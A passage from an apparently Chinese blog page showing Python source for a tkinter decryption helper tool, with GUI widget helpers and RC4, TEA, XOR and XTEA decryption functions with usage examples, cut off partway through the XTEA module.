class="subst">&#123;darkened[<span class="number">2</span>]:02x&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tk.Button(</span><br><span class="line">            parent,</span><br><span class="line">            text=full_text,</span><br><span class="line">            command=command,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            bg=bg,</span><br><span class="line">            fg=fg,</span><br><span class="line">            activebackground=darken_color(bg),</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">            padx=<span class="number">15</span>,</span><br><span class="line">            pady=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_label</span>(<span class="params">parent, text, font_size=<span class="number">12</span>, fg=<span class="string">&quot;white&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span>, emoji=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建美化的标签&quot;&quot;&quot;</span></span><br><span class="line">        full_text = <span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text</span><br><span class="line">        <span class="keyword">return</span> tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=full_text,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size),</span><br><span class="line">            fg=fg,</span><br><span class="line">            bg=bg</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_title</span>(<span class="params">parent, text, font_size=<span class="number">24</span>, fg=<span class="string">&quot;#4ECDC4&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span>, emoji=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建美化的标题&quot;&quot;&quot;</span></span><br><span class="line">        full_text = <span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span> <span class="subst">&#123;emoji&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text</span><br><span class="line">        <span class="keyword">return</span> tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=full_text,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            fg=fg,</span><br><span class="line">            bg=bg</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_algorithm_info</span>(<span class="params">parent, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建算法说明信息&quot;&quot;&quot;</span></span><br><span class="line">        info_text = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;❌ XOR加密: 最简单的加密算法，通过逐字节异或运算实现&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;🔒 RC4: 流加密算法，广泛用于网络协议如SSL/TLS&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;🍵 TEA: 小型加密算法，使用64位数据块和128位密钥&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;🍵 XTEA: TEA的改进版本，修复了一些安全漏洞&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;🍵 XXTEA: 更安全的TEA变体，处理变长数据块&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=info_text.get(algorithm, <span class="string">f&quot;❓ 未知算法: <span class="subst">&#123;algorithm&#125;</span>&quot;</span>),</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">10</span>),</span><br><span class="line">            fg=<span class="string">&quot;#FF9F1C&quot;</span>,</span><br><span class="line">            bg=<span class="string">&quot;#1a1a2e&quot;</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>rc4.py</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;RC4解密算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># RC4初始化</span></span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 生成密钥流并解密</span></span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> cipher_bytes:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">            k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">            decrypted.append(byte ^ k)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例1: 解密十六进制格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;730e7d1c4a1e&quot;</span>  <span class="comment"># 示例密文（十六进制）</span></span><br><span class="line">    key = <span class="string">&quot;key12345&quot;</span>             <span class="comment"># 密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 示例2: 解密字符串格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;encrypted_data&quot;</span>  <span class="comment"># 示例密文（字符串）</span></span><br><span class="line">    key = <span class="string">&quot;mysecretkey&quot;</span>            <span class="comment"># 密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>tea.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;TEA解密算法 - 修复32位无符号整数问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保密钥长度为16字节</span></span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) &lt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(key_bytes) &gt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 确保数据长度是8的倍数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">            padding = <span class="number">8</span> - (<span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span>)</span><br><span class="line">            cipher_bytes += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分块解密</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_bytes), <span class="number">8</span>):</span><br><span class="line">            block = cipher_bytes[i:i + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解包为两个32位无符号整数</span></span><br><span class="line">            v0 = <span class="built_in">int</span>.from_bytes(block[:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v1 = <span class="built_in">int</span>.from_bytes(block[<span class="number">4</span>:], <span class="string">&#x27;big&#x27;</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            k = [<span class="built_in">int</span>.from_bytes(key_bytes[i * <span class="number">4</span>:(i + <span class="number">1</span>) * <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># TEA解密过程</span></span><br><span class="line">            delta = <span class="number">0x9E3779B9</span></span><br><span class="line">            sum_val = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># 确保初始值为32位无符号</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 辅助函数确保所有中间计算都在32位范围内</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">tea_op</span>(<span class="params">value, shift, add_val</span>):</span><br><span class="line">                <span class="string">&quot;&quot;&quot;确保移位和加法操作保持在32位范围内&quot;&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) + add_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> ((value &gt;&gt; -shift) &amp; <span class="number">0xFFFFFFFF</span>) + add_val</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">                <span class="comment"># 分解计算步骤，确保每步都在32位范围内</span></span><br><span class="line">                term1 = tea_op(v0, <span class="number">4</span>, k[<span class="number">2</span>])</span><br><span class="line">                term2 = (v0 + sum_val) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                term3 = tea_op(v0, -<span class="number">5</span>, k[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">                v1 = (v1 - ((term1 ^ term2) ^ term3)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">                term1 = tea_op(v1, <span class="number">4</span>, k[<span class="number">0</span>])</span><br><span class="line">                term2 = (v1 + sum_val) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                term3 = tea_op(v1, -<span class="number">5</span>, k[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">                v0 = (v0 - ((term1 ^ term2) ^ term3)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 再次确保v0和v1为非负数</span></span><br><span class="line">            v0 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v1 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打包解密结果（添加额外检查）</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decrypted_block = v0.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + v1.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> OverflowError:</span><br><span class="line">                <span class="comment"># 作为备用方案，直接处理32位值</span></span><br><span class="line">                decrypted_block = (v0 &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + (v1 &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            decrypted.extend(decrypted_block)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 尝试UTF-8解码，失败则返回HEX</span></span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例1: 解密十六进制格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;0123456789abcdef&quot;</span>  <span class="comment"># 示例密文（十六进制）</span></span><br><span class="line">    key = <span class="string">&quot;1234567890123456&quot;</span>        <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 示例2: 解密字符串格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;encrypted_data&quot;</span>    <span class="comment"># 示例密文（字符串）</span></span><br><span class="line">    key = <span class="string">&quot;mysecretkey1234&quot;</span>          <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>xor1.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xor1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    执行异或加密或解密操作。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param data: 原始数据（字符串或 bytes）</span></span><br><span class="line"><span class="string">    :param key: 密钥（字符串或 bytes）</span></span><br><span class="line"><span class="string">    :return: 加密或解密后的 bytes 数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">        data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">        key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        key_byte = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        result.append(data[i] ^ key_byte)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密并返回可读格式。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    优先尝试将结果解码为 UTF-8 字符串；</span></span><br><span class="line"><span class="string">    如果失败，则返回其十六进制表示。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param ciphertext: 密文（bytes）</span></span><br><span class="line"><span class="string">    :param key: 解密密钥（字符串或 bytes）</span></span><br><span class="line"><span class="string">    :return: 可读明文（字符串）或错误信息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted_bytes = xor_encrypt_decrypt(ciphertext, key)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 尝试作为文本返回</span></span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted_bytes.<span class="built_in">hex</span>()  <span class="comment"># 否则返回 hex 字符串</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提供别名，方便外部调用 decrypt(data, key)</span></span><br><span class="line">decrypt = xor_decrypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试用例（仅当直接运行此模块时执行）</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_key = <span class="string">&quot;mysecretpassword&quot;</span></span><br><span class="line">    original_text = <span class="string">&quot;Hello, world! This is a test.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原文:&quot;</span>, original_text)</span><br><span class="line"></span><br><span class="line">    encrypted_data = xor_encrypt_decrypt(original_text, test_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密结果 (hex):&quot;</span>, encrypted_data.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    decrypted_text = xor_decrypt(encrypted_data, test_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure>

<p>xtea.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;XTEA解密算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保密钥长度为16字节</span></span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) &lt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(key_bytes) &gt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes[:<span class="number">16</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确保数据长度是8的倍数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">            padding = <span class="number">8</span> - (<span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span>)</span><br><span class="line">            cipher_bytes += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分块解密</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_bytes), <span class="number">8</span>):</span><br><span class="line">            block = cipher_bytes[i:i+<span class="number">8</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 解包为两个32位整数</span></span><br><span class="line">            v0, v1 = <span class="built_in">int</span>.from_bytes(block[:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(block[<span class="number">4</span>:], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            k = [<span class="built_in">int</span>.from_bytes(key_bytes[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># XTEA解密过程</span></span><br><span class="line">            delta = <span class="number">0x9E3779B9</span></span><br><span class="line">            